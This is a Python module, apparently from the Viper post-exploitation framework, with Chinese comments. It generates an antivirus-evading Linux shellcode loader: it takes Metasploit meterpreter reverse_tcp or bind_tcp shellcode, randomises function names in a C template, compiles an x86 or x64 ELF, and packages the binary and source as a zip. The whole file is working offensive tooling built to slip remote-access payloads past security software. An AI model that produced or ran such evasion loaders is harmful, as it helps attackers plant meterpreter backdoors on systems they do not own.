# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :


import time

from Lib.ModuleAPI import *


class PostModule(PostPythonModule):
    NAME_ZH = "基础ShellcodeLoader免杀(Linux)"
    DESC_ZH = "模块通过编码shellcode与基础的shellcodeloader结合的方式实现免杀.\n" \
              "模块适配以下类型载荷:\n" \
              "linux/x86/meterpreter/reverse_tcp  linux/x86/meterpreter/bind_tcp\n" \
              "linux/x64/meterpreter/reverse_tcp  linux/x64/meterpreter/bind_tcp"
    MODULETYPE = TAG2TYPE.Execution
    PLATFORM = ["Linux"]  # 平台
    PERMISSIONS = ["User", "Root"]  # 所需权限
    ATTCK = []  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/bkcs3p"]
    REFERENCES = ["https://astr0baby.wordpress.com/2019/04/23/metasploit-payloads-evasion-against-linux-av/"]
    AUTHOR = "Viper"

    OPTIONS = register_options([
        OptionHander(),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)

    def check(self):
        """执行前的检查函数"""
        payload = self.get_handler_payload()
        if payload not in ['linux/x86/meterpreter/reverse_tcp', 'linux/x86/meterpreter/bind_tcp',
                           'linux/x64/meterpreter/reverse_tcp', 'linux/x64/meterpreter/bind_tcp', ]:
            return False, "输入的载荷类型不满足要求,请参考模块说明"
        return True, None

    def run(self):
        shellcode = self.generate_hex_reverse_shellcode_by_handler()
        FUNCTION1 = self.random_str(8)
        FUNCTION2 = self.random_str(9)

        source_code = self.generate_context_by_template(filename="main.c", SHELLCODE_STR=shellcode, FUNCTION1=FUNCTION1,
                                                        FUNCTION2=FUNCTION2)
        gcc = Gcc(include_dir=self.module_data_dir, source_code=source_code)
        payload = self.get_handler_payload()
        if "x64" not in payload:
            arch = "x86"
        else:
            arch = "x64"
        binbytes = gcc.compile_c(arch=arch)

        exefilename = f"LinuxBaseShellcodeLoader_{int(time.time())}.elf"
        projectfilename = f"LinuxBaseShellcodeLoader_{int(time.time())}.zip"
        self.write_zip_vs_project(filename=projectfilename, source_code=source_code, source_code_filename="main.c",
                                  exe_file=exefilename,
                                  exe_data=binbytes)

        self.log_good("模块执行成功")
        self.log_good(f"请在<文件列表>中查看生成的zip文件: {projectfilename}")
